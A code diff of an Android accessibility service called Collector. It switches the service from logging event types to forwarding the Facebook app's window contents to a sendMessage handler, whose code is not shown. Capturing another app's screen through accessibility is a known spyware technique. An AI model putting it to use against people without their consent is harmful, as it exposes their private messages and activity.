@@ -71,29 +71,29 @@ public class Collector extends AccessibilityService {
     public void onAccessibilityEvent(AccessibilityEvent event) {
         final int eventType = event.getEventType();
 
-//        String packageName = event.getPackageName().toString();
-//        if (facebook.getPackageName().equals(packageName)) {
-//            facebook.sendMessage(eventType, getRootInActiveWindow());
-//        }
-        switch(eventType){
-            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
-                Log.i(TAG, "TYPE_VIEW_LONG_CLICKED");
-                break;
-            case AccessibilityEvent.TYPE_VIEW_SELECTED:
-                Log.i(TAG, "TYPE_VIEW_SELECTED");
-                break;
-            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                Log.i(TAG, "TYPE_VIEW_TEXT_CHANGED");
-                break;
-            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
-                Log.i(TAG, "TYPE_VIEW_TEXT_SELECTION_CHANGED");
-                break;
-            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
-                Log.i(TAG, "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY");
-                break;
-            case AccessibilityEvent.TYPE_VIEW_CLICKED:
-                Log.i(TAG, "TYPE_VIEW_CLICKED");
-                break;
+        String packageName = event.getPackageName().toString();
+        if (facebook.getPackageName().equals(packageName)) {
+            facebook.sendMessage(eventType, getRootInActiveWindow());
         }
+//        switch(eventType){
+//            case AccessibilityEvent.TYPE_VIEW_LONG_CLICKED:
+//                Log.i(TAG, "TYPE_VIEW_LONG_CLICKED");
+//                break;
+//            case AccessibilityEvent.TYPE_VIEW_SELECTED:
+//                Log.i(TAG, "TYPE_VIEW_SELECTED");
+//                break;
+//            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
+//                Log.i(TAG, "TYPE_VIEW_TEXT_CHANGED");
+//                break;
+//            case AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED:
+//                Log.i(TAG, "TYPE_VIEW_TEXT_SELECTION_CHANGED");
+//                break;
+//            case AccessibilityEvent.TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY:
+//                Log.i(TAG, "TYPE_VIEW_TEXT_TRAVERSED_AT_MOVEMENT_GRANULARITY");
+//                break;
+//            case AccessibilityEvent.TYPE_VIEW_CLICKED:
+//                Log.i(TAG, "TYPE_VIEW_CLICKED");
+//                break;
+//        }
     }
 }
